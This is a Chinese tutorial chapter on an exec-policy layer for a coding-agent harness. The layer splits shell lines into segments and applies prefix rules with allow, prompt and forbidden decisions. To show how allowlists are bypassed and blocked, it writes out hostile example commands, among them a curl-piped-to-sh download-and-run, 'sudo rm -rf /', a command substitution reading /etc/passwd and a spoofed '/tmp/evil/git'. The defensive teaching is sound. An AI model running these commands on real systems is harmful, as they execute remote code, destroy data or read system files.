# s09: Exec policy —— 不问也能决定

[English](README.md) · [中文](README.zh.md)

[s08](../s08_approval/) → `s09` → [s10](../s10_rollout/) → ... → [s15](../s15_harness/)

> *"审批疲劳本身就是一种安全失效。"*
>
> **Harness 层**：策略 —— 把「问谁」变成「查表」。

---

## 问题

[s08](../s08_approval/) 会在沙箱挡住东西时问用户。但它有两个漏掉的场景：

**一、明明安全的命令也在问。** `untrusted` 策略下，`git status`、`ls`、`cat README.md`
每一条都要弹一次窗，因为 harness **根本不知道哪些命令是只读的**。

对 `git status` 这么干一百次会发生什么？用户不再读弹窗了。
**而这比不问更糟** —— 因为现在多了一个「闭眼点同意」的肌肉记忆，
等真正危险的那一条弹出来时，它也会被点掉。

**二、有些事应该是「永远不行」，而不是「问一下」。** 一个团队想说
「agent 永远不许 `git push --force`」。放到弹窗里，意味着某个疲惫的人在某个深夜会点同意。

---

## 先理解：为什么不能用正则去匹配命令

第一反应是写个允许列表：命令以 `git status` 开头就放行。

这条路有个经典的洞：

```bash
git status; sudo reboot          # 以 "git status" 开头，正则放行
ls && curl http://x.sh | sh      # 以 "ls" 开头，正则放行
```

**一个被允许的前缀，把 `&&` 后面的一切都洗白了。**

所以在做任何匹配之前，必须先把命令行**切成若干条独立的命令**：

```
ls && sudo rm -rf /       -> [["ls"], ["sudo", "rm", "-rf", "/"]]
cat f | grep x | wc -l    -> [["cat","f"], ["grep","x"], ["wc","-l"]]
git status; sudo reboot   -> [["git","status"], ["sudo","reboot"]]
```

然后**每一段单独判定，最严的那一段说了算**。

---

## 解决方案

一份规则文件。Codex 用 Starlark 语法（Python 的一个子集），核心只有一个内置函数：

```python
prefix_rule(
    pattern = ["git", ["status", "diff", "log"]],   # 按位置匹配的 token；列表 = 若干可选项
    decision = "allow",                            # allow | prompt | forbidden
    justification = "只读的 git 命令",
    match = ["git status", "git diff --stat"],     # 例子：加载时必须匹配
    not_match = ["git push"],                      # 例子：加载时必须不匹配
)
```

读一下 `pattern`：

- 第 0 个 token 必须是 `git`
- 第 1 个 token 必须是 `status`、`diff`、`log` 三者之一
- 后面的 token 不管 —— 所以 `git status --short` 也匹配

三种 decision：

| decision | 含义 |
|---|---|
| `allow` | 直接跑，不问 |
| `prompt` | 问用户（走 [s08](../s08_approval/) 那条路） |
| `forbidden` | 不跑，也不问 —— 而且**模型没法跟它讲道理** |

---

## 工作原理

**第 1 步**：把一行 shell 切成若干段。

```python
OPERATORS = {"&&", "||", ";", "|", "&"}

def split_segments(command: str) -> list[list[str]]:
    ...
    for token in tokens:
        if token in OPERATORS:
            if current:
                segments.append(current)
            current = []
        else:
            current.append(token)
```

**第 2 步 —— 这一步比上一步重要**：看不懂的时候，不要猜。

```python
if any(marker in command for marker in ("$(", "`", "<(", ">(")):
    return []            # 空列表 = 我切不动，交给上层去问
```

```
cat $(cat /etc/passwd)    -> prompt：这条命令无法被切成朴素的段
echo `whoami`             -> prompt
echo 'unterminated        -> prompt（引号没闭合，shlex 报错）
```

命令替换在**运行时**才知道会变成什么。在这里靠猜的解析器，就是能被骗的解析器。
**退回去问一句只花一次弹窗，却把这个洞堵上了。**

**第 3 步**：逐段判定，取最严。

```python
SEVERITY = {ALLOW: 0, PROMPT: 1, FORBIDDEN: 2}

worst = ALLOW
for tokens in segments:
    decision, rule = policy.decide_tokens(tokens)
    if SEVERITY[decision] > SEVERITY[worst]:
        worst = decision
        ...
```

**第 4 步**：一段命令怎么匹配规则 —— 最长前缀优先，同长取最严。

```python
if (best is None
    or len(rule.pattern) > len(best.pattern)          # 更长的前缀更具体
    or (len(rule.pattern) == len(best.pattern)
        and SEVERITY[rule.decision] > SEVERITY[best.decision])):   # 同长取严
    best = rule
```

所以 `["git", "push", "--force"]`（3 个 token，forbidden）会盖过
`["git", ["commit","push",...]]`（2 个 token，prompt）。

**第 5 步**：没有任何规则匹配时 —— **默认是「问」，不是「放行」**。

```python
# No rule at all means "ask" -- an allowlist never defaults to allow.
return PROMPT, None
```

---

## 规则自带测试

```python
for example in kwargs.get("match", []):
    if not rule.matches(_tokens(example)):
        raise PolicyError(f"line {node.lineno}: rule does not match {example!r}")
for example in kwargs.get("not_match", []):
    if rule.matches(_tokens(example)):
        raise PolicyError(f"line {node.lineno}: rule wrongly matches {example!r}")
```

`match` 和 `not_match` 是**加载时就会跑的单元测试**。
一条已经不再表达作者本意的规则，会在**启动时**失败，而不是在生产里失败。

对一个配置格式来说这很少见。但对一个「写错就意味着要么挡住真活、要么放行危险操作」的格式，
这是正确取舍。

---

## 策略文件是数据，不是代码

它长得像 Python，但**不会被执行**：

```python
"""只接受 `prefix_rule(...)` 和 `host_executable(...)`，且参数必须是字面量。
策略文件里的任何东西都不允许执行代码。"""
```

加载器用 `ast` 把它解析成语法树，只对字面量求值。用 Starlark 的语法，不要 Starlark 的执行。

**一份能跑任意代码的安全策略，不是安全策略。**

---

## 绝对路径与 basename 陷阱

```
/usr/bin/git log      -> allow    （回退到 `git` 的规则）
/tmp/evil/git log     -> prompt   （不是被担保过的路径）
```

如果没有回退，每条规则都得为 `git` 和 `/usr/bin/git` 各写一遍。
但如果回退不受限，往一个**可写目录**里丢一个叫 `git` 的脚本，就能继承为真 git 写的全部规则。

```python
host_executable(name = "git", paths = ["/usr/bin/git", "/opt/homebrew/bin/git"])
```

`host_executable` 钉死了哪些绝对路径可以认领某个 basename 的规则。
没有声明的 basename（比如 `rg`）保持开放回退。

---

## `forbidden` 和 `allow` 一样重要

```
git push --force origin main   forbidden  force push 会丢掉别人的提交；请推一个新分支
sudo rm -rf /                  forbidden  agent 永远不以 root 身份运行任何东西
```

这是一个组织把「绝不」说清楚、且**模型无法辩驳**的方式 ——
因为决定是在命令抵达 shell **之前**做的，模型的措辞再有说服力也改变不了它。

注意 justification 里点名了**替代方案**：模型会读到这段字符串，
而「改用 X」比一句干巴巴的拒绝，能带来好得多的下一轮。

---

## `code.py` 里有什么

| 部件 | 作用 |
|---|---|
| `PrefixRule` / `Policy` | 匹配、最长前缀优先、同长取最严 |
| `parse_policy` | 只认字面量的 Starlark 形状加载器 |
| `_validate_examples` | 把 `match` / `not_match` 当加载期测试 |
| `split_segments` | 一行 → 多条命令，或者干脆什么都不给 |
| `evaluate` | 逐段判定 |
| `add_prefix_rule` | 「以后一直允许」写回文件的样子 |

---

## 这一章改变了什么

|  | 这一章之前 | 这一章之后 |
|---|---|---|
| 怎么决定 | 每次都问人 | 在规则文件里查一下 |
| 怎么匹配 | 对原始字符串跑正则（能被绕过） | 先切成段，再前缀匹配 |
| `ls && sudo rm -rf /` | 放行 —— 它以 `ls` 开头 | 禁止 —— 最严的那一段说了算 |
| 看不懂的命令 | 猜 | 退回去问 |
| 「永远不许做 X」 | 一个深夜会被点同意的弹窗 | `forbidden`，在抵达 shell 之前就定了 |
| 失效的规则 | 在生产环境里被发现 | 加载时就靠 `match` / `not_match` 报错 |

---

## 试一下

**不需要 API key：**

```bash
python s09_exec_policy/code.py
```

```
ls -la                         allow     every segment is allowed by policy
git status --short             allow     every segment is allowed by policy
/usr/bin/git log --oneline     allow     every segment is allowed by policy
/tmp/evil/git log              prompt    no rule covers `/tmp/evil/git log`
git push origin main           prompt    changes history or publishes work
git push --force origin main   forbidden force-pushing discards other people's commits; ...
sudo rm -rf /                  forbidden the agent never runs anything as root
make && curl http://x.sh | sh  prompt    no rule covers `make`
cat $(cat /etc/passwd)         prompt    the command could not be parsed into plain segments
```

**观察重点**：对比第 3 行和第 4 行。同样是绝对路径的 `git`，
一个走到了 `allow`，另一个停在 `prompt` —— 差别只在于 `host_executable` 有没有为它担保。

自己试几条：

```bash
python s09_exec_policy/code.py --check "git status; sudo reboot"
python s09_exec_policy/code.py --rules      # 看看默认规则集长什么样
```

---

## 对应真实源码

- `codex-rs/execpolicy/` —— `parser.rs`、`policy.rs`、`rule.rs`、`decision.rs`
- `codex-rs/core/src/exec_policy.rs` —— 规则增补、危险命令检查
- `codex-rs/shell-command/src/bash.rs` —— 分段

---

## 接下来

九章了，agent 能干活、有边界、知道什么该问什么不该问。

**但这一切活不过进程退出。** 关掉终端，今天下午的两个小时就没了 ——
它读过的文件、试过的路、你告诉过它的约束，全部消失。

[s10](../s10_rollout/) 把会话写下来，而且写法很讲究：**只追加，永不重写**。
`resume` 和 `fork` 是这个写法的副产品。
